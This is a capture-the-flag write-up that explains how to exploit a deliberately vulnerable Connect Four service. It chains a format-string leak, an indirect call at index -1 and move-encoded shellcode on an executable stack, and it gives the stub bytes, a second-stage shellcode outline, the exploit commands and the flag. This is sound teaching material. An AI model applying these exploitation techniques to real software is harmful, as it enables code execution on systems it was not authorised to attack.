# CEOnnect Four

**Category:** misc · **Points:** 113 · **Solves:** 55 · **Author:** xy

## Challenge

The CEO just closed a funding round and emptied one bottle of wine too many
with the stakeholders. There is enough slack left in the sprint for a round of
*CEOnnect Four*, their favourite team alignment activity, and the CEO does not
take feedback well. Can you push to prod nevertheless?

The handout has the game source, the binary, the `ynetd` wrapper and the service
Dockerfile; the service writes the flag to `./flag` and runs the game in `/chal`.

## TL;DR

Three indexing mistakes chain together:

* `printf(win_strings.s[score_ceo])` uses an out-of-bounds array element as a
  **format string**; `score_ceo` reaches 6 when one CEO move joins two groups,
  and element 6 is the player's name. A `%p` name leaks `rsi`, `0x204` below
  the move history.
* `(*player.end_fns[missing])()` with `missing = 4 - score_player` reads
  `end_fns[-1]` when the player has five in a row — the eight bytes of
  `player.name`, so the last name is a function pointer.
* `add_move()` packs three bits per move into a 64-byte stack buffer that is
  never reset, and `play_user()` ignores `play_move()` failing on a full
  column, so moves write chosen bits into the stack without changing the board.

Rounds 1 and 2 assemble a stub there, round 2 leaks its address, round 3 jumps
to it; the stub reads a second stage that prints the flag.

## Files

| file | description |
| --- | --- |
| `c4.c` | the game (311 lines) |
| `c4`, `Makefile`, `build.sh`, `Dockerfile.build` | prebuilt x86-64 PIE, not stripped; rebuild with `-g -Wl,-z,execstack` |
| `ynetd`, `ctf-ynetd-2024.12.31/` | TCP wrapper: 3 s CPU, 32 MB data, 300 s alarm |
| `Dockerfile`, `compose.yml`, `entrypoint.sh` | image: write `./flag`, `./ynetd ./c4` in `/chal` |
| `solve.py` | the exploit below |

Tools: `python3` (standard library only). On an arm64 host run the binary
through Docker; the script does that for you.

## Analysis

### The game loop

```c
struct player_data player = {"\0", zero_missing, one_missing, two_missing, three_missing};
struct ceo_data win_strings = {"FUriOuS", "AnGryYy", "angry", "alarmed", "pleased"};
struct hist_moves hist = {.idx = -1};               /* once, before the loop */
while (win == 'C' && tries-- > 0) {                  /* three rounds, three names */
    fgets(player.name, pow(2, 3-tries), stdin);      /* sizes 2, 4, 8 -> 1, 3, 7 chars */
    clear_state(&state);                             /* clears the board only */
    for (int i = 0; i < 42; i++) {
        play_user(&state);                           /* play_move() + add_move() */
        score_player = count(&state, 'x');
        missing = 4 - score_player;
        if (score_player >= 4) { win = 'x'; break; }
        play_ceo(&state);
        score_ceo = count(&state, 'C');
        if (score_ceo >= 4) { win = 'C'; break; }
    }
    printf("CEO is >>");
    printf(win_strings.s[score_ceo]);                /* (1) out of bounds, format string */
    printf("<<!\n\n");
    printf("There are %d missing to get 4 for you, %s.\n", missing, player.name);
    (*player.end_fns[missing])();                    /* (2) index -1 */
}
```

`count()` returns the longest horizontal, vertical or diagonal run. A move
normally only creates four, but one that fills a gap between two groups makes a
longer run — that is how `score_ceo` reaches 6 and `score_player` reaches 5.

### (1) `s[6]` is the player name

`win_strings` is `char s[5][8]` and the compiler places it directly below
`player`:

| object | frame offset |
| --- | --- |
| `win_strings.s[k]` | `rbp-0x80+8k` |
| `player.name`, `player.end_fns[0..3]` | `rbp-0x50`, `rbp-0x48 .. rbp-0x30` |
| `hist.idx`, `hist.hist` | `rbp-0xd0`, `rbp-0xcc .. rbp-0x8d` |

`s[5]` is already out of bounds and `s[6]` is exactly `player.name`. With the
round-2 name `%p`, the program executes `printf("%p\n")` with no argument and
prints the caller's leftover `rsi`: the address of the move history. The frame
does not move between rounds, so `&hist.hist = rsi + 0x204` for this build.

### (2) `end_fns[-1]` is the name

`missing` is computed before the win check, so a five-in-a-row gives
`missing == -1` and the loop still breaks with `win='x'`. The indirect call
compiles to

```asm
mov  -0x20(%rbp),%eax     ; missing
cltq
mov  -0x48(%rbp,%rax,8),%rax
call *%rax
```

With `rax = -1` the load lands on `rbp-0x50`: the eight bytes of `player.name`
(seven characters plus the NUL written by `fgets`). The last name is the jump
target.

### (3) Three bits per move, never cleared

```c
static inline void add_move(struct hist_moves *hist, int move) {
    int idx = ++hist->idx;
    switch (idx % 8) {
        case 0: case 1: hist->hist[idx/8*3]   |= move << (5-3*(idx%8));      break;
        case 2:         hist->hist[idx/8*3]   |= move >> 1;
                        hist->hist[idx/8*3+1] |= move << 7;                  break;
        case 3: case 4: hist->hist[idx/8*3+1] |= move << (4-3*((idx%8)-3));  break;
        case 5:         hist->hist[idx/8*3+1] |= move >> 2;
                        hist->hist[idx/8*3+2] |= move << 6;                  break;
        case 6: case 7: hist->hist[idx/8*3+2] |= move << (3-3*((idx%8)-6));  break;
    }
}
```

Eight moves fill exactly three bytes, most significant group first:

```
byte0 = m0<<5 | m1<<2 | m2>>1
byte1 = (m2&1)<<7 | m3<<4 | m4<<1 | m5>>2
byte2 = (m5&3)<<6 | m6<<3 | m7
```

`play_user()` calls `play_move()` **without checking the result**, then records
the move anyway:

```c
play_move(state, 'x', x);      /* returns -3 if the column is full */
add_move(state->hist, x);      /* the move is recorded regardless */
```

A move into a full column leaves the board untouched but still contributes
three bits, so a round can keep writing while the board stays playable. `hist`
is initialised once and `clear_state()` only clears `state.f`, so bytes written
in round 1 survive into rounds 2 and 3.

## Solution

### 1. Round 1: 21 recorded moves

The name is `A` with no newline; 21 moves are sent, ten into full columns, so
they only write bits. `hist[0..7]` becomes:

```
5b 50 6b c0 00 89 c7 50    pop rbx; push rax; imul eax,eax,0; mov edi,eax; push rax
```

The round ends with a CEO win (vertical four in column 4), so `win == 'C'`.

### 2. Round 2: fill a gap, score six, leak

The name is `%p` plus the newline — three bytes, the maximum for
`fgets(player.name, 4, stdin)`. Nineteen moves build the row `xCCCCCC` at
`y=2`: CEO discs in columns 1-3 and 5-6, column 4 empty. The CEO's last move
drops there and joins six in a row, so the program runs `printf("%p\n")`.

The same 19 moves write `hist[8..14] = eb 03 12 e2 50 5a 5e`: `jmp +3`, two
skipped bytes, `pop rdx`, `pop rsi`; the round again ends with a CEO win.

### 3. Round 3: call the payload

The name is the leaked address plus `0x204` as seven raw little-endian bytes
(user addresses have a zero high byte; `fgets` NUL-terminates the eighth).
Eighteen moves write `hist[15..19] = 6a 65 5a 0f 05`, then complete a
five-in-a-row on the diagonal `x + y = 5`, so `missing == -1` and the call
lands in the name:

```asm
5b         pop  rbx            ; drop the return address of the call
50         push rax            ; rax = &hist.hist
6b c0 00 89 c7   imul eax,eax,0; mov edi,eax
50         push rax
eb 03      jmp  short +3
12 e2 50   (skipped)
5a         pop  rdx            ; rdx = 0
5e         pop  rsi            ; rsi = &hist.hist
6a 65 5a   push 0x65; pop rdx
0f 05      syscall             ; read(0, &hist.hist, 0x65)
```

Execution resumes at `hist+20`, exactly where the second stage lands after 101
bytes are read from the same socket.

### 4. Second stage: print `./flag`

53 bytes of position-independent code, syscalls only: `open("./flag")`,
`read(fd, rsp, 0x7f)`, `write(1, rsp, n)`, `exit(0)`; the path is pushed as an
immediate, so nothing depends on libc or the environment.

### 5. Run it

```bash
tar xzf ceonnect_four.tar.gz && cd ceonnect_four
echo 'flag{TESTFLAG}' > flag          # the service writes the real flag here
python3 solve.py --docker             # or --local ./c4 on x86-64 Linux
```

The local run against the provided binary produced:

```
leaked rsi = 0x4002805a30 -> &hist.hist = 0x4002805c34
There are -1 missing to get 4 for you, 4\...@.
flag{TESTFLAG}
```

The bytes after `you, ` are the address read as a C string. Against the instance
(the platform front end terminates TLS, so the script uses `ssl` with SNI
unless `--plain` is given):

```bash
python3 solve.py --host <HOST> --port <PORT>
```

## Flag

```
flag{W0w_c0ngr47z_f0r_pu5h1ng_70_pr0d_y0u_34rn3d_y0ur_fl4g:e07e8d319d8cf772ab91166b1d0eaba2}
```

## Notes

* The stack must be executable: stub and shellcode live in `hist`, hence `-Wl,-z,execstack`.
* Short names must be sent **without** a trailing newline: `fgets` stops when
  the buffer is full and the newline belongs to the next `get_user_move()`,
  which reads one character and discards the rest of the line.
* Not every byte is reachable at every offset, because each 3-bit field is a
  move (0-6) and never 7. For a byte at offset `b` the illegal patterns are
  `b%3==0`: `b>=0xE0` or `(b&0x1C)==0x1C`; `b%3==1`: `(b&0x70)==0x70` or
  `(b&0x0E)==0x0E`; `b%3==2`: `(b&0x38)==0x38` or `(b&7)==7`; the inverse
  encoder for eight moves is in `solve.py`.
* `&hist.hist = rsi + 0x204` holds for the provided glibc; `rsi` is left over
  from `printf("CEO is >>")`. Re-measure it for another libc, e.g. by building
  the source with `fprintf(stderr, "hist=%p\n", (void*)&hist);` and comparing
  both addresses on one run.
* A round-3 name is a raw address, so a `0x0a` byte ends the input line and a
  `0x00` byte terminates `fgets` early (about 2% per attempt); respawn.
* `execve` of stack code fails with `ENOENT` under qemu-user, which is why the
  second stage uses `open`/`read`/`write`. On real hardware either shape works.
* The 3 s CPU limit forces an interactive exploit: wait for the leak, then send round 3.
